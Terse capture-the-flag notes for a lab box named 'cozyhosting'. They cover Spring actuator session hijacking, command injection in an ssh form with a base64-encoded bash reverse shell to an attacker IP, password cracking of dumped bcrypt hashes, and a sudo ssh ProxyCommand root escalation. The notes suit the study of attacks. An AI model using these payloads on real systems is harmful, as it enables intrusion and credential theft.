cozyhosting

  based on 404 error it uses java spring(boot)
  fuzzing with SecLists/Discovery/Web-Content/spring-boot.txt reveals unsecured /actuator
  
  /actuator/sessions contains a session token of another user
  it can be copied into a JSESSIONID cookie

  trying /admin with the new cookie leads to the hosting page

  the inputs of the form on this page are compiled into an ssh command with improper sanitization

  starting nc -l and injecting a shell oneliner with burp gives a shell
  echo${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0ICAwPiYxIA==|base64${IFS}-d|bash
  first field doesn't matter, second is vulnerable to doing ;oneliner;

  this gives access to user app@cozyhosting

  in /app there's an app binary
  cloudhosting-0.0.1.jar which can be stolen with nc

  decompiling this gives:

    database name is cozyhosting
    username=kanderson&password=MRdEQuv6~6P9
    spring.datasource.username=postgres
    spring.datasource.password=Vg&nvzAQ7XxR

  forwarding db port with nc and connecting gives:
    cozyhosting=# select * from users;
    name    |                           password                           | role  
    ----------+------------------------------------------------------------+-------
    kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
    admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

  running hashid on the hashes tells it's brypt

  running john with rockyou on the first hash gives password manchesterunited

  ls /home gives user josh

  josh manchesterunited gives access to user.txt

  sudo -l reveals josh can run ssh as root

  sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x from gtfobins gives root shell
